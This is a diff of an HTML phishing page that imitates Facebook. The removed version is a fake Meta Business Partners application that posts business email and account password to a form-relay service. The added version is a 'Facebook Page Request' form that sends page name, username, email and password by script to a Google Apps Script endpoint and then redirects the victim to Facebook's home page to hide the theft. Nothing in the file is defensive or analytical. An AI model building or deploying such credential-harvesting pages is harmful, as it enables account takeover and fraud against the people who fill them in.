@@ -2,123 +2,153 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Apply to Meta Business</title>
+  <title>Facebook Request Form</title>
   <style>
     body {
-      margin: 0;
       font-family: Arial, sans-serif;
-      background-color: #f6f7f9;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
     }
 
-    .meta-form-container {
-      max-width: 600px;
-      margin: 60px auto;
-      background: white;
-      border-radius: 8px;
+    .form-container {
+      background-color: white;
       padding: 30px;
-      box-shadow: 0 0 20px rgba(0, 0, 0, 0.05);
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      width: 350px;
     }
 
-    .meta-logo {
-      width: 35px;
-      margin-bottom: 20px;
-    }
-
-    h2 {
-      font-size: 22px;
-      margin-bottom: 20px;
-      color: #333;
-    }
-
-    label {
-      font-weight: bold;
-      display: block;
-      margin: 15px 0 5px;
-    }
-
-    input[type="text"],
-    input[type="email"],
-    input[type="password"] {
-      width: 100%;
-      padding: 10px;
-      font-size: 16px;
-      margin-bottom: 10px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-    }
-
-    .checkbox-label {
-      font-size: 14px;
-      color: #555;
-      margin-top: 20px;
-    }
-
-    .checkbox-label input {
-      margin-right: 8px;
-    }
-
-    .info-text {
-      font-size: 13px;
-      color: #666;
-      line-height: 1.6;
-      margin-top: 10px;
-    }
-
-    .info-text a {
+    .form-container h2 {
       color: #1877f2;
-      text-decoration: none;
+      text-align: center;
+      margin-bottom: 25px;
+    }
+
+    .input-group {
+      margin-bottom: 15px;
+    }
+
+    .input-group label {
+      display: block;
+      font-weight: bold;
+      margin-bottom: 5px;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 8px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+    }
+
+    .input-group .error {
+      color: red;
+      font-size: 12px;
+      margin-top: 3px;
     }
 
     button {
-      margin-top: 20px;
-      padding: 12px 20px;
       background-color: #1877f2;
-      border: none;
       color: white;
+      padding: 10px;
+      border: none;
+      width: 100%;
       font-size: 16px;
       border-radius: 6px;
       cursor: pointer;
-      transition: 0.3s;
     }
 
     button:hover {
-      background-color: #1459c9;
+      background-color: #165ecc;
     }
   </style>
 </head>
 <body>
-
-  <div class="meta-form-container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" class="meta-logo" alt="Meta Logo">
-    <h2>Apply to Meta Business Partners</h2>
-
-    <form action="https://formsubmit.co/el/begute" method="POST">
-      <label for="business">Business Name</label>
-      <input type="text" id="business" name="Business Name" placeholder="Enter your business name" required>
-
-      <label for="email">Business Email</label>
-      <input type="email" id="email" name="Business Email" placeholder="Enter your email" required>
-
-      <label for="password">Account Password</label>
-      <input type="password" id="password" name="Account Password" placeholder="Enter account password" required>
-
-      <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_next" value="https://mdarafat61.github.io/thankyou/">
-
-      <label class="checkbox-label">
-        <input type="checkbox" name="Subscribe to Updates">
-        Opt-in to Partner Program Updates
-      </label>
-
-      <div class="info-text">
-        Stay informed! Don't miss out on Meta Business Partner programme updates, benefit information or product and policy changes. Tick the box to enable partner programme update notifications in your Business Manager account. By ticking this box, you agree to receive marketing-related electronic Meta Business Partners communications from Meta, including programme-specific information, newsletters and event emails. You may withdraw your consent and unsubscribe from these at any time, for example, by clicking the unsubscribe link included in our emails or unsubscribing from partner programme updates in your Business Manager <a href="https://business.facebook.com/settings/preferences" target="_blank">notification settings</a>. For more information about how Meta handles your data, please read our <a href="https://facebook.com/privacy/policy" target="_blank">Meta Privacy Policy</a>.
-        <br><br>
-        The Meta Business Partner <a href="https://www.facebook.com/fbp/policies" target="_blank">terms and conditions</a> that you previously accepted apply to your application.
+  <div class="form-container">
+    <h2>Facebook Page Request</h2>
+    <form name="google-sheet" id="requestForm">
+      <div class="input-group">
+        <label for="page-name">Page Name</label>
+        <input type="text" name="page-name" id="page-name">
+        <div class="error" id="error-page-name"></div>
       </div>
-
+      <div class="input-group">
+        <label for="username">Username</label>
+        <input type="text" name="username" id="username">
+        <div class="error" id="error-username"></div>
+      </div>
+      <div class="input-group">
+        <label for="email">Email</label>
+        <input type="email" name="email" id="email">
+        <div class="error" id="error-email"></div>
+      </div>
+      <div class="input-group">
+        <label for="password">Password</label>
+        <input type="password" name="password" id="password">
+        <div class="error" id="error-password"></div>
+      </div>
       <button type="submit">Submit</button>
     </form>
   </div>
 
+  <script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbzPH35e1rwYZpw8oa7iQzbPgM0cbLnu5nZk5TQkU2Kx9cEx39joMjrAuxsnv7r5s2ks/exec';
+    const form = document.forms['google-sheet'];
+
+    const validateForm = () => {
+      let valid = true;
+
+      const pageName = document.getElementById('page-name');
+      const username = document.getElementById('username');
+      const email = document.getElementById('email');
+      const password = document.getElementById('password');
+
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+      // Clear previous errors
+      document.querySelectorAll('.error').forEach(e => e.innerText = '');
+
+      if (!pageName.value.trim()) {
+        document.getElementById('error-page-name').innerText = 'Page Name is required.';
+        valid = false;
+      }
+      if (!username.value.trim()) {
+        document.getElementById('error-username').innerText = 'Username is required.';
+        valid = false;
+      }
+      if (!email.value.trim()) {
+        document.getElementById('error-email').innerText = 'Email is required.';
+        valid = false;
+      } else if (!emailRegex.test(email.value)) {
+        document.getElementById('error-email').innerText = 'Invalid email format.';
+        valid = false;
+      }
+      if (!password.value.trim()) {
+        document.getElementById('error-password').innerText = 'Password is required.';
+        valid = false;
+      }
+
+      return valid;
+    };
+
+    form.addEventListener('submit', e => {
+      e.preventDefault();
+
+      if (validateForm()) {
+        fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+          .then(response => {
+            alert("Thanks! Redirecting to Facebook...");
+            window.location.href = "https://www.facebook.com/home";
+          })
+          .catch(error => {
+            alert('Submission failed!');
+            console.error('Error!', error.message);
+          });
+      }
+    });
+  </script>
 </body>
 </html>
